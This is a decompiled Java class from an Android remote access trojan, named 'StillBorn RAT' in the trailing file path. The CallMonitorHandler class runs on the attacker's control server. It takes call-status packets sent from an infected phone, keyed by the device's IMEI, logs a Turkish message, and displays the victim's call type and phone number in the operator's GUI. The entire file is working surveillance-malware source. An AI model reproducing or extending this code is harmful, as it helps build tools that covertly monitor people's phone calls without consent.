/*  1:   */ package handler;
/*  2:   */ 
/*  3:   */ import Packet.CallStatusPacket;
/*  4:   */ import Packet.Packet;
/*  5:   */ import gui.GUI;
/*  6:   */ import java.util.HashMap;
/*  7:   */ import server.Server;
/*  8:   */ 
/*  9:   */ public class CallMonitorHandler
/* 10:   */   implements PacketHandler
/* 11:   */ {
/* 12:   */   private GUI gui;
/* 13:   */   private int channel;
/* 14:   */   private String imei;
/* 15:   */   
/* 16:   */   public CallMonitorHandler(int channel, String imei, GUI gui)
/* 17:   */   {
/* 18:35 */     this.gui = gui;
/* 19:36 */     this.channel = channel;
/* 20:37 */     this.imei = imei;
/* 21:   */   }
/* 22:   */   
/* 23:   */   public void receive(Packet p, String imei) {}
/* 24:   */   
/* 25:   */   public void handlePacket(Packet p, String temp_imei, Server c)
/* 26:   */   {
/* 27:48 */     this.gui.logTxt("Arama görüntüleme bilgisi alındı");
/* 28:49 */     ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).getStorage(this.channel).reset();
/* 29:50 */     CallStatusPacket packet = (CallStatusPacket)p;
/* 30:51 */     this.gui.addMonitoredCall(this.imei, packet.getType(), packet.getPhonenumber());
/* 31:   */   }
/* 32:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.CallMonitorHandler
 * JD-Core Version:    0.7.0.1
 */